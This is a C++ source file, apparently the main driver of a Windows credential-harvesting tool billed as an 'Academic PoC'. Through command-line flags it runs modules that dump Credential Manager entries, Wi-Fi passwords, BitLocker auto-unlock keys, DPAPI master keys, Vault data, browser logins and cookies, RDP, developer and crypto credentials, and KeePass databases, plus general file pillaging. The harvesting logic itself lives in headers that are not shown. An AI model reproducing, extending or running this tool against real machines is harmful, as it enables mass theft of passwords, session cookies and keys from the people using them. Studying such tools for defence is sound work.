#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <windows.h>
#include <string>
#include "SystemCredentialsDump.h"
#include "DpapiMasterKeys.h"
#include "VaultDump.h"
#include "ChromiumDump.h"
#include "FirefoxDump.h"
#include "GeckoAndIECookies.h"
#include "RdpDump.h"
#include "DevCredentialsDump.h"
#include "CryptoKeysDump.h"
#include "Pillaging.h"
#include "KeePass.h"
#include "WhateverDPAPIBlob.h"
#include <psapi.h>

void PrintBanner() {
    #define RESET   "\033[0m"
    #define CYAN    "\033[36m"
    #define GREEN   "\033[32m"
    #define BOLD    "\033[1m"

    std::cout << CYAN << "========================================================\n" << RESET;
    std::cout << BOLD << "  Promiscuous-CredsHarvester — Academic PoC Engine      \n" << RESET;
    std::cout << CYAN << "--------------------------------------------------------\n" << RESET;
    std::cout << "  Made by: " << GREEN << "Turekkerem (Kerem Ozdogan)" << RESET << "\n";
    std::cout << CYAN << "========================================================\n" << RESET;
}

void PrintHelp(const char* progName) {
    std::cout << "Usage: " << progName << " [options]\n\n";
    std::cout << "Main options:\n";
    std::cout << "  --dump                  Run all modules (full dump)\n\n";
    std::cout << "System & Credential Manager options:\n";
    std::cout << "  --creds                 Dump all system credentials\n";
    std::cout << "  --wcm                   Dump Windows Credential Manager\n";
    std::cout << "  --wifi                  Dump Wi-Fi network passwords\n";
    std::cout << "  --bitlocker             Decrypt BitLocker auto-unlock keys\n";
    std::cout << "  --dpapi                 Dump DPAPI master keys\n";
    std::cout << "  --vault                 Dump Windows Vault\n\n";
    std::cout << "Browser & Session options:\n";
    std::cout << "  --browsers              Dump all browsers and cookies\n";
    std::cout << "  --browser <type>        Dump a specific browser:\n";
    std::cout << "                            - chromium (Chrome, Edge, Brave, etc.)\n";
    std::cout << "                            - firefox\n";
    std::cout << "                            - cookies (Gecko and IE cookies)\n\n";
    std::cout << "Additional options:\n";
    std::cout << "  --rdp                   Dump RDP artifacts\n";
    std::cout << "  --dev                   Dump developer / CLI credentials\n";
    std::cout << "  --crypto                Dump cryptographic key material\n";
    std::cout << "  --pillaging             General file pillaging\n";
    std::cout << "  --keepass               Dump KeePass databases\n";
    std::cout << "  --uncrypt-blob <path>   Odszyfruj blob DPAPI z pliku\n";
    std::cout << "  -h, --help              Display this help message\n";
}

int main(int argc, char* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    PrintBanner();

    if (argc < 2) {
        PrintHelp(argv[0]);
        return 0;
    }

    bool runAll = false;
    bool ranAny = false;

    // Check if full dump or help is requested
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--dump") {
            runAll = true;
            break;
        }
        if (arg == "--help" || arg == "-h") {
            PrintHelp(argv[0]);
            return 0;
        }
    }

    if (runAll) {
        std::cout << "[*] Executing full dump (--dump)...\n\n";
        KeePass::Run();
        SystemCredentialsDump::DumpCredManager();
        SystemCredentialsDump::DumpWifiPasswords();
        SystemCredentialsDump::DecryptBitLockerAutoUnlock();
        SystemCredentialsDump::DumpEAPCertificates();
        DpapiMasterKeys::Dump();
        VaultDump::Run();
        ChromiumDump::Run();
        FirefoxDump::Run();
        GeckoAndIECookies::RunAll();
        RdpDump::Run();
        DevCredentialsDump::Run();
        CryptoKeysDump::Run();
        Pillaging::Run();
        ranAny = true;
    } else {
        for (int i = 1; i < argc; ++i) {
            std::string arg = argv[i];

            if (arg == "--creds") {
                std::cout << "[*] Dumping all system credentials...\n";
                SystemCredentialsDump::DumpCredManager();
                SystemCredentialsDump::DumpWifiPasswords();
                SystemCredentialsDump::DecryptBitLockerAutoUnlock();
                SystemCredentialsDump::DumpEAPCertificates();
                ranAny = true;
            }
            else if (arg == "--wcm") {
                std::cout << "[*] Dumping Windows Credential Manager...\n";
                SystemCredentialsDump::DumpCredManager();
                ranAny = true;
            }
            else if (arg == "--wifi") {
                std::cout << "[*] Dumping Wi-Fi passwords...\n";
                SystemCredentialsDump::DumpWifiPasswords();
                ranAny = true;
            }
            else if (arg == "--bitlocker") {
                std::cout << "[*] Attempting to decrypt BitLocker auto-unlock...\n";
                SystemCredentialsDump::DecryptBitLockerAutoUnlock();
                ranAny = true;
            }
            else if (arg == "--dpapi") {
                std::cout << "[*] Dumping DPAPI master keys...\n";
                DpapiMasterKeys::Dump();
                ranAny = true;
            }
            else if (arg == "--vault") {
                std::cout << "[*] Dumping Windows Vault...\n";
                VaultDump::Run();
                ranAny = true;
            }
            else if (arg == "--browsers") {
                std::cout << "[*] Dumping all browsers and cookies data...\n";
                ChromiumDump::Run();
                FirefoxDump::Run();
                GeckoAndIECookies::RunAll();
                ranAny = true;
            }
            else if (arg == "--browser") {
                if (i + 1 < argc) {
                    std::string bType = argv[++i];
                    if (bType == "chromium") {
                        std::cout << "[*] Dumping Chromium-based browsers...\n";
                        ChromiumDump::Run();
                    } else if (bType == "firefox") {
                        std::cout << "[*] Dumping Firefox data...\n";
                        FirefoxDump::Run();
                    } else if (bType == "cookies") {
                        std::cout << "[*] Dumping Gecko / IE cookies...\n";
                        GeckoAndIECookies::RunAll();
                    } else {
                        std::cout << "[-] Unknown browser type: " << bType << " (use: chromium, firefox, cookies)\n";
                    }
                    ranAny = true;
                } else {
                    std::cout << "[-] Error: --browser switch requires an argument (chromium, firefox, cookies)\n";
                }
            }
            else if (arg == "--rdp") {
                std::cout << "[*] Dumping RDP artifacts...\n";
                RdpDump::Run();
                ranAny = true;
            }
            else if (arg == "--dev") {
                std::cout << "[*] Dumping developer credentials...\n";
                DevCredentialsDump::Run();
                ranAny = true;
            }
            else if (arg == "--crypto") {
                std::cout << "[*] Dumping cryptographic key materials...\n";
                CryptoKeysDump::Run();
                ranAny = true;
            }
            else if (arg == "--pillaging") {
                std::cout << "[*] Running file pillaging...\n";
                Pillaging::Run();
                ranAny = true;
            }
            else if (arg == "--keepass") {
                std::cout << "[*] Running KeePass module...\n";
                KeePass::Run();
                ranAny = true;
            }
            else if (arg == "--uncrypt-blob") {
                if (i + 1 < argc) {
                    std::string path = argv[++i];
                    std::wstring wpath(path.begin(), path.end()); // prosta konwersja
                    std::cout << "[*] Odszyfrowywanie bloba DPAPI: " << path << "\n";
                    int ret = WhateverDpapiBlob::DecryptBlobFromFile(wpath);
                    if (ret != 0)
                        std::cout << "[-] Nie udało się odszyfrować bloba.\n";
                } else {
                    std::cout << "[-] Błąd: --uncrypt-blob wymaga ścieżki do pliku.\n";
                }
                ranAny = true;
            }
        }
    }

    if (!ranAny && !runAll) {
        std::cout << "[-] No valid arguments provided. Use --help to view available options.\n";
    }

    std::cout << "\n========================================================\n";
    std::cout << "[+] Execution finished.\n";

    return 0;
}
